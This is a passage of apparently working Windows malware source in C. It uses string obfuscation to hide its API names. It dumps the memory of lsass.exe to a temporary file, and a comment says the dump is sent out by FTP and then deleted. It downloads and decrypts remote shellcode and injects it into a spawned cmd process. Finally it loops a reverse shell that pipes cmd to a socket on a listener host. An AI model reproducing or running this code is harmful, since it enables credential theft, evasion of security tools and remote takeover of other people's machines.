	char part_func_5_18[] = "o";
	char part_func_5_19[] = "r";
	char part_func_5_20[] = "y";
	strcpy(full_func_5, part_func_5_1);
	strcat(full_func_5, part_func_5_2);
	strcat(full_func_5, part_func_5_3);
	strcat(full_func_5, part_func_5_4);
	strcat(full_func_5, part_func_5_5);
	strcat(full_func_5, part_func_5_6);
	strcat(full_func_5, part_func_5_7);
	strcat(full_func_5, part_func_5_8);
	strcat(full_func_5, part_func_5_9);
	strcat(full_func_5, part_func_5_10);
	strcat(full_func_5, part_func_5_11);
	strcat(full_func_5, part_func_5_12);
	strcat(full_func_5, part_func_5_13);
	strcat(full_func_5, part_func_5_14);
	strcat(full_func_5, part_func_5_15);
	strcat(full_func_5, part_func_5_16);
	strcat(full_func_5, part_func_5_17);
	strcat(full_func_5, part_func_5_18);
	strcat(full_func_5, part_func_5_19);
	strcat(full_func_5, part_func_5_20);
	//printf("%s\n",full_func_5);
	
	char full_func_6[23];	//NtProtectVirtualMemory
	char part_func_6_1[] = "N";
	char part_func_6_2[] = "t";
	char part_func_6_3[] = "P";
	char part_func_6_4[] = "r";
	char part_func_6_5[] = "o";
	char part_func_6_6[] = "t";
	char part_func_6_7[] = "e";
	char part_func_6_8[] = "c";
	char part_func_6_9[] = "t";
	char part_func_6_10[] = "V";
	char part_func_6_11[] = "i";
	char part_func_6_12[] = "r";
	char part_func_6_13[] = "t";
	char part_func_6_14[] = "u";
	char part_func_6_15[] = "a";
	char part_func_6_16[] = "l";
	char part_func_6_17[] = "M";
	char part_func_6_18[] = "e";
	char part_func_6_19[] = "m";
	char part_func_6_20[] = "o";
	char part_func_6_21[] = "r";
	char part_func_6_22[] = "y";
	strcpy(full_func_6, part_func_6_1);
	strcat(full_func_6, part_func_6_2);
	strcat(full_func_6, part_func_6_3);
	strcat(full_func_6, part_func_6_4);
	strcat(full_func_6, part_func_6_5);
	strcat(full_func_6, part_func_6_6);
	strcat(full_func_6, part_func_6_7);
	strcat(full_func_6, part_func_6_8);
	strcat(full_func_6, part_func_6_9);
	strcat(full_func_6, part_func_6_10);
	strcat(full_func_6, part_func_6_11);
	strcat(full_func_6, part_func_6_12);
	strcat(full_func_6, part_func_6_13);
	strcat(full_func_6, part_func_6_14);
	strcat(full_func_6, part_func_6_15);
	strcat(full_func_6, part_func_6_16);
	strcat(full_func_6, part_func_6_17);
	strcat(full_func_6, part_func_6_18);
	strcat(full_func_6, part_func_6_19);
	strcat(full_func_6, part_func_6_20);
	strcat(full_func_6, part_func_6_21);
	strcat(full_func_6, part_func_6_22);
	//printf("%s\n",full_func_6);
	
	
	
	char full_func_7[23];	//NtWaitForSingleObject
	char part_func_7_1[] = "N";
	char part_func_7_2[] = "t";
	char part_func_7_3[] = "W";
	char part_func_7_4[] = "a";
	char part_func_7_5[] = "i";
	char part_func_7_6[] = "t";
	char part_func_7_7[] = "F";
	char part_func_7_8[] = "o";
	char part_func_7_9[] = "r";
	char part_func_7_10[] = "S";
	char part_func_7_11[] = "i";
	char part_func_7_12[] = "n";
	char part_func_7_13[] = "g";
	char part_func_7_14[] = "l";
	char part_func_7_15[] = "e";
	char part_func_7_16[] = "O";
	char part_func_7_17[] = "b";
	char part_func_7_18[] = "j";
	char part_func_7_19[] = "e";
	char part_func_7_20[] = "c";
	char part_func_7_21[] = "t";
	strcpy(full_func_7, part_func_7_1);
	strcat(full_func_7, part_func_7_2);
	strcat(full_func_7, part_func_7_3);
	strcat(full_func_7, part_func_7_4);
	strcat(full_func_7, part_func_7_5);
	strcat(full_func_7, part_func_7_6);
	strcat(full_func_7, part_func_7_7);
	strcat(full_func_7, part_func_7_8);
	strcat(full_func_7, part_func_7_9);
	strcat(full_func_7, part_func_7_10);
	strcat(full_func_7, part_func_7_11);
	strcat(full_func_7, part_func_7_12);
	strcat(full_func_7, part_func_7_13);
	strcat(full_func_7, part_func_7_14);
	strcat(full_func_7, part_func_7_15);
	strcat(full_func_7, part_func_7_16);
	strcat(full_func_7, part_func_7_17);
	strcat(full_func_7, part_func_7_18);
	strcat(full_func_7, part_func_7_19);
	strcat(full_func_7, part_func_7_20);
	strcat(full_func_7, part_func_7_21);
	//printf("%s\n",full_func_7);
	
	
	char full_func_8[20];	//NtFreeVirtualMemory
	char part_func_8_1[] = "N";
	char part_func_8_2[] = "t";
	char part_func_8_3[] = "F";
	char part_func_8_4[] = "r";
	char part_func_8_5[] = "e";
	char part_func_8_6[] = "e";
	char part_func_8_7[] = "V";
	char part_func_8_8[] = "i";
	char part_func_8_9[] = "r";
	char part_func_8_10[] = "t";
	char part_func_8_11[] = "u";
	char part_func_8_12[] = "a";
	char part_func_8_13[] = "l";
	char part_func_8_14[] = "M";
	char part_func_8_15[] = "e";
	char part_func_8_16[] = "m";
	char part_func_8_17[] = "o";
	char part_func_8_18[] = "r";
	char part_func_8_19[] = "y";
	strcpy(full_func_8, part_func_8_1);
	strcat(full_func_8, part_func_8_2);
	strcat(full_func_8, part_func_8_3);
	strcat(full_func_8, part_func_8_4);
	strcat(full_func_8, part_func_8_5);
	strcat(full_func_8, part_func_8_6);
	strcat(full_func_8, part_func_8_7);
	strcat(full_func_8, part_func_8_8);
	strcat(full_func_8, part_func_8_9);
	strcat(full_func_8, part_func_8_10);
	strcat(full_func_8, part_func_8_11);
	strcat(full_func_8, part_func_8_12);
	strcat(full_func_8, part_func_8_13);
	strcat(full_func_8, part_func_8_14);
	strcat(full_func_8, part_func_8_15);
	strcat(full_func_8, part_func_8_16);
	strcat(full_func_8, part_func_8_17);
	strcat(full_func_8, part_func_8_18);
	strcat(full_func_8, part_func_8_19);
	//printf("%s\n",full_func_8);
	
	
	// --- START GET FUNCTIONS --- //
	FARPROC wsa_startup_func = GetProcAddress(hDLL_ws2__32, GetOriginal(wsa_startup_offset,ALL_ALPHANUM,sizeof(wsa_startup_offset)));
	FARPROC wsa_socket_func =  GetProcAddress(hDLL_ws2__32, GetOriginal(wsa_socket_offset,ALL_ALPHANUM,sizeof(wsa_socket_offset)));
	FARPROC h_tons_func = GetProcAddress(hDLL_ws2__32, GetOriginal(h_tons_offset,ALL_ALPHANUM,sizeof(h_tons_offset)));;
	FARPROC inet_addr_func = GetProcAddress(hDLL_ws2__32, GetOriginal(inet_addr_offset,ALL_ALPHANUM,sizeof(inet_addr_offset)));;
	FARPROC wsa_connect_func = GetProcAddress(hDLL_ws2__32,GetOriginal(wsa_connect_offset,ALL_ALPHANUM,sizeof(wsa_connect_offset)));
	FARPROC wsa_cleanup_func = GetProcAddress(hDLL_ws2__32,GetOriginal(wsa_cleanup_offset,ALL_ALPHANUM,sizeof(wsa_cleanup_offset)));
	FARPROC close_sock_func = GetProcAddress(hDLL_ws2__32,GetOriginal(close_sock_offset,ALL_ALPHANUM,sizeof(close_sock_offset)));
	FARPROC recv_func = GetProcAddress(hDLL_ws2__32,GetOriginal(recv_offset,ALL_ALPHANUM,sizeof(recv_offset)));
	//printf("[+] GOT ALL FUNCTION ADDRESSES FROM THE ws2_32.dll\n");
	
	FARPROC create_process_A_func = GetProcAddress(hDLL_k_er_32,GetOriginal(create_process_A_offset,ALL_ALPHANUM,sizeof(create_process_A_offset)));
	FARPROC wait_for_single_object_func = GetProcAddress(hDLL_k_er_32,GetOriginal(wait_for_single_object_offset,ALL_ALPHANUM,sizeof(wait_for_single_object_offset)));
	FARPROC	h_11_p_open_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_open_offset,ALL_ALPHANUM,sizeof(h_11_p_open_offset)));	//WinHttpOpen
	FARPROC h_11_p_conn_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_conn_offset,ALL_ALPHANUM,sizeof(h_11_p_conn_offset)));	//WinHttpConnect
	FARPROC h_11_p_open_req_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_open_req_offset,ALL_ALPHANUM,sizeof(h_11_p_open_req_offset)));	//WinHttpOpenRequest
	FARPROC h_11_p_send_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_send_offset,ALL_ALPHANUM,sizeof(h_11_p_send_offset)));	//WinHttpSendRequest
	FARPROC h_11_p_recv_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_recv_offset,ALL_ALPHANUM,sizeof(h_11_p_recv_offset))); //WinHttpReceiveResponse
	FARPROC h_11_p_query_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_query_offset,ALL_ALPHANUM,sizeof(h_11_p_query_offset))); //WinHttpQueryDataAvailable
	FARPROC h_11_p_read_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_read_offset,ALL_ALPHANUM,sizeof(h_11_p_read_offset))); //WinHttpReadData
	FARPROC h_11_p_close_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_close_offset,ALL_ALPHANUM,sizeof(h_11_p_close_offset))); //WinHttpCloseHandle
	FARPROC wr_dmp_func = GetProcAddress(hdll_d_b_g,GetOriginal(wr_dmp_offset,ALL_ALPHANUM,sizeof(wr_dmp_offset))); //MiniDumpWriteDump
	FARPROC pss_capture_func = GetProcAddress(hDLL_k_er_32,GetOriginal(pss_capture_offset,ALL_ALPHANUM,sizeof(pss_capture_offset)));	//PssCaptureSnapshot
	FARPROC create_snap_func = GetProcAddress(hDLL_k_er_32,GetOriginal(create_snap_offset,ALL_ALPHANUM,sizeof(create_snap_offset)));
	FARPROC proc_first_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_first_offset,ALL_ALPHANUM,sizeof(proc_first_offset)));
	FARPROC proc_next_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_next_offset,ALL_ALPHANUM,sizeof(proc_next_offset)));
	FARPROC cr_file_func = GetProcAddress(hDLL_k_er_32,GetOriginal(cr_file_offset,ALL_ALPHANUM,sizeof(cr_file_offset)));
	NtOpenProcess NT_OpenProcess = (NtOpenProcess)GetProcAddress(hDLL_n__t, full_func_2); 
	NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hDLL_n__t, full_func_3); 
	NtClose NT_Close = (NtClose)GetProcAddress(hDLL_n__t, full_func_1);
	NtAllocateVirtualMemory NT_VirtualAlloc = (NtAllocateVirtualMemory)GetProcAddress(hDLL_n__t,full_func_4);	
	NtWriteVirtualMemory NT_WriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hDLL_n__t,full_func_5);		
	NtProtectVirtualMemory NT_ProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hDLL_n__t,full_func_6);	
	NtWaitForSingleObject NT_WaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hDLL_n__t,full_func_7);
	NtFreeVirtualMemory NT_FreeVirtualMemory = (NtFreeVirtualMemory)GetProcAddress(hDLL_n__t,full_func_8);

	//NtOpenMutant NT_OpenMutant = (NtOpenMutant)GetProcAddress(hDLL_n__t,"NtOpenMutant");
	//NtCreateMutant NT_CreateMutant = (NtCreateMutant)GetProcAddress(hDLL_n__t,"NtCreateMutant");
	// --- END GET FUNCTOINS --- //

	//DUMP LSASS AND SEND IT




	//if (argc != 2){printf("[x] USAGE: ./lsass_dumper.exe <lssas.exe pid>\n");exit(1);}
	//printf("[x] filling vars\n");
	//DWORD PID=atoi(argv[1]);
	
	char full_string_tmp_file_1[30];	// \\??\\C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\fawf3na.chkf
	char part_string_tmp_file_1_1[] = "\\";
	char part_string_tmp_file_1_2[] = "??";
	char part_string_tmp_file_1_3[] = "\\";
	char part_string_tmp_file_1_4[] = "C";
	char part_string_tmp_file_1_5[] = ":";
	char part_string_tmp_file_1_6[] = "\\";
	char part_string_tmp_file_1_7[] = "Wi";
	char part_string_tmp_file_1_8[] = "nd";
	char part_string_tmp_file_1_9[] = "ow";
	char part_string_tmp_file_1_10[] = "s\\";
	char part_string_tmp_file_1_11[] = "T";
	char part_string_tmp_file_1_12[] = "e";
	char part_string_tmp_file_1_13[] = "mp\\";
	char part_string_tmp_file_1_14[] = "SSS";
	char part_string_tmp_file_1_15[] = "_";
	char part_string_tmp_file_1_16[] = "ce";
	char part_string_tmp_file_1_17[] = "1";
	char part_string_tmp_file_1_18[] = "aaa";
	char part_string_tmp_file_1_19[] = "99ce";
	char part_string_tmp_file_1_20[] = "4bdb";
	char part_string_tmp_file_1_21[] = "0101";
	char part_string_tmp_file_1_22[] = "000000";
	char part_string_tmp_file_1_23[] = "984b2414";
	char part_string_tmp_file_1_24[] = "aa";
	char part_string_tmp_file_1_25[] = "\\";
	char part_string_tmp_file_1_26[] = "f";
	char part_string_tmp_file_1_27[] = "a";
	char part_string_tmp_file_1_28[] = "w";
	char part_string_tmp_file_1_29[] = "f";
	char part_string_tmp_file_1_30[] = "3";
	char part_string_tmp_file_1_31[] = "n";
	char part_string_tmp_file_1_32[] = "a";
	char part_string_tmp_file_1_33[] = ".";
	char part_string_tmp_file_1_34[] = "c";
	char part_string_tmp_file_1_35[] = "h";
	char part_string_tmp_file_1_36[] = "k";
	char part_string_tmp_file_1_37[] = "f";
	strcpy(full_string_tmp_file_1, part_string_tmp_file_1_1);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_2);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_3);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_4);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_5);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_6);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_7);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_8);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_9);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_10);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_11);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_12);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_13);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_14);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_15);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_16);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_17);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_18);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_19);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_20);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_21);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_22);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_23);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_24);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_25);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_26);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_27);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_28);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_29);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_30);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_31);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_32);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_33);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_34);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_35);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_36);
	strcat(full_string_tmp_file_1, part_string_tmp_file_1_37);
	
	HANDLE hCheckFile;
	hCheckFile = cr_file_func(full_string_tmp_file_1,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_NEW,FILE_ATTRIBUTE_NORMAL,NULL);
	if(GetLastError() == 80){
		goto INIT_BACKDOOR;
	}
	// continue block code

	HANDLE hDumpFile;
	BOOL bProcDump;
	
	//printf("[x] declaring client id\n");
	CLIENT_ID CID;
	ObjectAttributes Object_Attr = { sizeof(Object_Attr),NULL };
	
	//printf("[x] declaring pe32\n");
	PROCESSENTRY32 pe32;
	//printf("[x] filling pe32\n");
	pe32.dwSize =  sizeof(PROCESSENTRY32);
	DWORD PID;
	
	//printf("[x] taking snap\n");
	//Take snapshot
	HANDLE snapshot = create_snap_func(TH32CS_SNAPPROCESS, 0);
	
	//printf("[x] proc32 first\n");
	// Enumerate the snapshot
    proc_first_func(snapshot, &pe32);	
    
	
	
	
	char full_string_1[10];	//lsass.exe
	char part_string_1_1[] = "l";
	char part_string_1_2[] = "s";
	char part_string_1_3[] = "a";
	char part_string_1_4[] = "s";
	char part_string_1_5[] = "s";
	char part_string_1_6[] = ".";
	char part_string_1_7[] = "e";
	char part_string_1_8[] = "x";
	char part_string_1_9[] = "e";
	strcpy(full_string_1, part_string_1_1);
	strcat(full_string_1, part_string_1_2);
	strcat(full_string_1, part_string_1_3);
	strcat(full_string_1, part_string_1_4);
	strcat(full_string_1, part_string_1_5);
	strcat(full_string_1, part_string_1_6);
	strcat(full_string_1, part_string_1_7);
	strcat(full_string_1, part_string_1_8);
	strcat(full_string_1, part_string_1_9);
	//printf("%s\n",full_string_1);
	
	//printf("[x] going to loop\n");
	// Loop through the whole snapshot until 'target.exe' is found
    do {
        if (_stricmp(pe32.szExeFile, full_string_1) == 0) {
			PID = pe32.th32ProcessID;
			CID.UniqueProcess = (HANDLE) pe32.th32ProcessID;
			CID.UniqueThread = NULL;
			break;
        }  
    } while (proc_next_func(snapshot, &pe32));
	
	
	
	
	char full_string_2[30];	// \\??\\C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\dumpfile.dmp
	char part_string_2_1[] = "\\";
	char part_string_2_2[] = "??";
	char part_string_2_3[] = "\\";
	char part_string_2_4[] = "C";
	char part_string_2_5[] = ":";
	char part_string_2_6[] = "\\";
	char part_string_2_7[] = "Wi";
	char part_string_2_8[] = "nd";
	char part_string_2_9[] = "ow";
	char part_string_2_10[] = "s\\";
	char part_string_2_11[] = "T";
	char part_string_2_12[] = "e";
	char part_string_2_13[] = "mp\\";
	char part_string_2_14[] = "SSS";
	char part_string_2_15[] = "_";
	char part_string_2_16[] = "ce";
	char part_string_2_17[] = "1";
	char part_string_2_18[] = "aaa";
	char part_string_2_19[] = "99ce";
	char part_string_2_20[] = "4bdb";
	char part_string_2_21[] = "0101";
	char part_string_2_22[] = "000000";
	char part_string_2_23[] = "984b2414";
	char part_string_2_24[] = "aa";
	char part_string_2_25[] = "\\";
	char part_string_2_26[] = "d";
	char part_string_2_27[] = "u";
	char part_string_2_28[] = "m";
	char part_string_2_29[] = "p";
	char part_string_2_30[] = "f";
	char part_string_2_31[] = "i";
	char part_string_2_32[] = "l";
	char part_string_2_33[] = "e";
	char part_string_2_34[] = ".";
	char part_string_2_35[] = "d";
	char part_string_2_36[] = "m";
	char part_string_2_37[] = "p";
	strcpy(full_string_2, part_string_2_1);
	strcat(full_string_2, part_string_2_2);
	strcat(full_string_2, part_string_2_3);
	strcat(full_string_2, part_string_2_4);
	strcat(full_string_2, part_string_2_5);
	strcat(full_string_2, part_string_2_6);
	strcat(full_string_2, part_string_2_7);
	strcat(full_string_2, part_string_2_8);
	strcat(full_string_2, part_string_2_9);
	strcat(full_string_2, part_string_2_10);
	strcat(full_string_2, part_string_2_11);
	strcat(full_string_2, part_string_2_12);
	strcat(full_string_2, part_string_2_13);
	strcat(full_string_2, part_string_2_14);
	strcat(full_string_2, part_string_2_15);
	strcat(full_string_2, part_string_2_16);
	strcat(full_string_2, part_string_2_17);
	strcat(full_string_2, part_string_2_18);
	strcat(full_string_2, part_string_2_19);
	strcat(full_string_2, part_string_2_20);
	strcat(full_string_2, part_string_2_21);
	strcat(full_string_2, part_string_2_22);
	strcat(full_string_2, part_string_2_23);
	strcat(full_string_2, part_string_2_24);
	strcat(full_string_2, part_string_2_25);
	strcat(full_string_2, part_string_2_26);
	strcat(full_string_2, part_string_2_27);
	strcat(full_string_2, part_string_2_28);
	strcat(full_string_2, part_string_2_29);
	strcat(full_string_2, part_string_2_30);
	strcat(full_string_2, part_string_2_31);
	strcat(full_string_2, part_string_2_32);
	strcat(full_string_2, part_string_2_33);
	strcat(full_string_2, part_string_2_34);
	strcat(full_string_2, part_string_2_35);
	strcat(full_string_2, part_string_2_36);
	strcat(full_string_2, part_string_2_37);
	//printf("%s\n",full_string_2);
	
	//printf("[+] creating file\n");
	hDumpFile=cr_file_func(
		full_string_2,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	//if (!hDumpFile){printf("[x] Failed to create the file, error: %ld\n",GetLastError());exit(1);}
	
	
	


	
	
	HANDLE hProcess_dmp;
	//printf("the proc id is --> %d\n",PID);
	// --- START GET PROCESS --- //
	//printf("[NtOpenProcess] GETTING Process..\n");
	STATUS = NT_OpenProcess(&hProcess_dmp,PROCESS_ALL_ACCESS,&Object_Attr,&CID);
	if (STATUS != STATUS_SUCCESS) {
		//printf("[NtOpenProcess] Failed to get handle to process, error 0x%lx\n", STATUS);
		return EXIT_FAILURE;
	}
	//printf("[NtOpenProcess] Got Handle to process! (%p)\n",hProcess);
	// --- END GET PROCESS --- //	

	//if (hProcess == NULL){printf("[x] Failed to get handle to lsass process, error: %ld\n",GetLastError());exit(1);}
	 
	HPSS snapshot_handle;
	DWORD CaptureFlags = (DWORD)PSS_CAPTURE_VA_CLONE
                            | PSS_CAPTURE_HANDLES
                            | PSS_CAPTURE_HANDLE_NAME_INFORMATION
                            | PSS_CAPTURE_HANDLE_BASIC_INFORMATION
                            | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
                            | PSS_CAPTURE_HANDLE_TRACE
                            | PSS_CAPTURE_THREADS
                            | PSS_CAPTURE_THREAD_CONTEXT
                            | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
                            | PSS_CREATE_BREAKAWAY
                            | PSS_CREATE_BREAKAWAY_OPTIONAL
                            | PSS_CREATE_USE_VM_ALLOCATIONS
                            | PSS_CREATE_RELEASE_SECTION;
    DWORD status = pss_capture_func(
        hProcess_dmp,
		CaptureFlags,
        CONTEXT_ALL,
        &snapshot_handle
    );
	
	MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
	ZeroMemory(&CallbackInfo, sizeof (MINIDUMP_CALLBACK_INFORMATION));
	CallbackInfo.CallbackRoutine = MyMiniDumpWriteDumpCallback;
	CallbackInfo.CallbackParam = NULL;
	
	bProcDump= wr_dmp_func(
		(HANDLE) snapshot_handle,
		PID,
		hDumpFile,
		MiniDumpWithFullMemory,
		NULL,
		NULL,
		&CallbackInfo
	);
	
	//if (bProcDump == FALSE){printf("[x] Failed to dump lsass, error: %ld\n",GetLastError());exit(1);}
	
	//printf("[+] lsass dumped successfully");
	
	CloseHandle(hDumpFile);
	
	//IMPORTANT -> send file via ftp system(curl) and delete the .dmp file after that
	report();
	
	DeleteFile(full_string_2);
	
INIT_BACKDOOR:

	// -- GET ENCRYPTED SHELLCODE -- //
	netops(h_11_p_open_func,h_11_p_conn_func,h_11_p_open_req_func,h_11_p_send_func,h_11_p_recv_func,h_11_p_query_func,h_11_p_read_func,h_11_p_close_func);
	// -- END GET ENCRYPTED SHELLCODE-- //
	

	
	HANDLE hProcess;
	STARTUPINFOA proc_1;
	PROCESS_INFORMATION proc_info_1;
	memset(&proc_1,0,sizeof(proc_1));
	proc_1.cb=sizeof(proc_1);
	proc_1.dwFlags=STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

	//create process
	create_process_A_func(NULL,GetOriginal(exe_c_C_M_d_offset,ALL_ALPHANUM,sizeof(exe_c_C_M_d_offset)),NULL,NULL,TRUE,0,NULL,NULL,&proc_1,&proc_info_1); //spawm cmd	
	hProcess = proc_info_1.hProcess;
	
	HANDLE hThread;
	DWORD OldProtect_MEM = 0;
	DWORD OldProtect_THREAD = 0;
	SIZE_T BytesWritten = 0;
	PVOID Buffer = NULL;	//for shellcode allocation


	// --- start decryption --- //
	decrypt(magic,magic_size,key5);

	decrypt(magic,magic_size,key4);

	decrypt(magic,magic_size,key3);

	decrypt(magic,magic_size,key2);

	decrypt(magic,magic_size,key1);
	// --- end decryption --- //
	
	//printf("[NtAllocateVirtualMemory] Allocating [RW-] memory..\n");
	STATUS=NT_VirtualAlloc(hProcess,&Buffer,0,&magic_size, MEM_COMMIT | MEM_RESERVE ,PAGE_READWRITE);	
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtAllocateVirtualMemory] Failed to allocate memeory , error 0x%lx\n",STATUS);
		//goto CLEANUP;
	}
	//printf("[NtAllocateVirtualMemory] Memory Allocated!\n");
	

	
	//printf("[NtWriteVirtualMemory] Writing shellcode into allocated memory..\n");
	STATUS=NT_WriteVirtualMemory(hProcess,Buffer,magic,magic_size,&BytesWritten);
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtWriteVirtualMemory] Failed to write into memeory , error 0x%lx\n",STATUS);
		//printf("[NtWriteVirtualMemory] BytesWritten -> %lu\t ShellcodeSize -> %lu\n",BytesWritten,shellcode_size);
		//goto CLEANUP;
	}
	//printf("[NtWriteVirtualMemory] Shellcode Written!, shellcode size -> %lu bytes\tactually written -> %lu bytes\n",shellcode_size,BytesWritten);

	//printf("[NtProtectVirtualMemory] Adding [--X] to memory..\n");
	STATUS=NT_ProtectVirtualMemory(hProcess,&Buffer,&magic_size,PAGE_EXECUTE_READ,&OldProtect_MEM);
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtProtectVirtualMemory] Failed to add exec to page , error 0x%lx\n",STATUS);
		//goto CLEANUP;
	}
	//printf("[NtProtectVirtualMemory] [--X] added!\n");
	
	// --- END MEMORY OPERATIONS --- //
	
	
	// --- START CREATE THREAD --- //

	//printf("[NtCreateThreadEx] CREATING THREAD IN Remote Process\n");
	
	ObjectAttributes Object_Attr_thread = { sizeof(Object_Attr_thread),NULL };
	STATUS=NT_CreateThreadEx(&hThread,THREAD_ALL_ACCESS,&Object_Attr_thread,hProcess,Buffer,NULL,FALSE,0,0,0,NULL);
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtCreateThreadEx] Failed to create thread , error 0x%lx\n",STATUS);
		//goto CLEANUP;
	}
	//printf("[NtCreateThreadEx] Thread Created (0x%p)..\n",hThread);	
	
	// --- END CREATE THREAD --- //
	
	// --- START WAIT --- //
	//printf("[0x%p] Waiting to Finish Execution\n",hThread);
	//STATUS=NT_WaitForSingleObject(hThread,FALSE,NULL);
	wait_for_single_object_func(hProcess,INFINITE);
	//printf("[NtWaitForSingleObject] Thread (0x%p) Finished! Beginning Cleanup\n",hThread);
	// --- END WAIT --- //

	
	while (1){
		//start winsock 2.2
		//printf("[+] initializing winsock 2.2\n");
		if ( wsa_startup_func(MAKEWORD(2,2),&wsaData) != 0 ){
			//printf("[x] winsock failed, err code: %d\n",WSAGetLastError());
			exit(1);
		};

		//create socket
		//printf("[+] creating socket\n");
		client_socket=wsa_socket_func(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
		if (client_socket == INVALID_SOCKET){
			//printf("[x] socket creation failed, err code: %d\n",WSAGetLastError());
			wsa_cleanup_func();
			exit(1);
		
		}
		
		//assigning server values
		server_addr.sin_family=AF_INET;
		server_addr.sin_port=h_tons_func(_p__0rt);
		server_addr.sin_addr.s_addr=inet_addr_func(GetOriginal(listener_addr_offset,ALL_ALPHANUM,sizeof(listener_addr_offset)));
		if ( server_addr.sin_addr.s_addr == INADDR_NONE ){
			//printf("[x] invalid address\n[x]exiting\n");
			close_sock_func(client_socket);
			wsa_cleanup_func();
			exit(1);
			
		};

		//connect to server
		//printf("[+] connecting to server\n");
		
		do{
			connect = wsa_connect_func(client_socket,(SOCKADDR *)&server_addr,sizeof(server_addr),NULL,NULL,NULL,NULL);	
			
		} while (connect != 0);
		
		/*
		if (connect != 0){
			//printf("[x] can't connect to server\n");
			close_sock_func(client_socket);
			wsa_cleanup_func();
			exit(1);
		}
		*/
		//recieve data
		//recv_func(client_socket,recv_buffer,sizeof(recv_buffer),0);	



		// CREATING PROCESS //
		//declare process struct and info 
		STARTUPINFOA proc;
		PROCESS_INFORMATION proc_info;
		memset(&proc,0,sizeof(proc));
		proc.cb=sizeof(proc);
		proc.dwFlags=STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		proc.hStdInput=(HANDLE) client_socket;
		proc.hStdOutput=(HANDLE) client_socket;
		proc.hStdError=(HANDLE) client_socket; //pipe stderr stdin stdout to socket

		//create process
		create_process_A_func(NULL,GetOriginal(exe_c_C_M_d_offset,ALL_ALPHANUM,sizeof(exe_c_C_M_d_offset)),NULL,NULL,TRUE,0,NULL,NULL,&proc,&proc_info); //spawm cmd	
		
		//wait for process to finish
		
		wait_for_single_object_func(proc_info.hProcess,INFINITE);
		CloseHandle(proc_info.hProcess);
		CloseHandle(proc_info.hThread);
		
		
		// PROCESS END //
		
	 
		//CLEANUP	
		//memset(recv_buffer,0,sizeof(recv_buffer));
		close_sock_func(client_socket);
		wsa_cleanup_func();
	}


CLEANUP:
	if (Buffer){
		STATUS=NT_FreeVirtualMemory(hProcess,&Buffer,&magic_size,MEM_DECOMMIT);
		if (STATUS_SUCCESS != STATUS) {
            //printf("[NtClose] Failed to decommit allocated buffer, error 0x%lx\n", STATUS);
        }
		//printf("[NtClose] decommitted allocated buffer (0x%p) from process memory\n", Buffer);
	}
	if(hThread){
		//printf("[NtClose] Closing hThread handle\n");
		NT_Close(hThread);
	}
	if(hProcess){
		//printf("[NtClose] Closing hProcess handle\n");
		NT_Close(hProcess);
	}

}



//
// Purpose: 
//   Entry point for the process
//
// Parameters:
//   None
// 
// Return value:
//   None, defaults to 0 (zero)
//
int main(int argc, char** argv) 
{ 
    // If command-line parameter is "install", install the service. 
